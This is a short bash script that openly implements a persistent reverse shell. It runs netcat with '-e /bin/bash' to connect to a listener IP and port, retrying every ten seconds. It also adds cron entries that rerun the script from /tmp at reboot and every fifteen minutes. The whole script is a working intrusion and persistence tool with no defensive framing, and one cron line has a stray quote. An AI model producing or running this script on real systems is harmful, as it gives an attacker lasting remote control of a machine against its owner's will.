#!/bin/bash

# Usage reverse_shell.sh TARGET_IP TARGET_PORT

# Set the target IP and Target port params
TARGET_IP=$1
TARGET_PORT=$2

# Function to establish reverse shell connection
reverse_shell() {
    # Try to connect to the listener and spawn a shell
    while true; do
        nc $TARGET_IP $TARGET_PORT -e /bin/bash
        if [ $? -ne 0 ]; then
            echo "Failed to connect. Retrying in 10 seconds..."
        fi
        sleep 10  # Wait before retrying in case of connection failure
    done
}

# Function to schedule cron jobs for reverse shell
schedule_cron_jobs() {
    # Schedule a cron job to execute reverse shell function
    # Schedules the job at system boot to keep persistence
    (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c '/tmp/reverse_shell.sh'") | crontab -
    (crontab -l 2>/dev/null; echo "*/15 * * * * /bin/bash -c '/tmp/reverse_shell.sh''") | crontab -  # Run every 15 minutes
    # Add more cron jobs here if needed
}

# Main function
main() {
    # Start the reverse shell connection
    reverse_shell &

    # Schedule cron jobs for reverse shell
    schedule_cron_jobs

    echo "Reverse shell script has started and cron jobs scheduled."
}

# Call the main function
main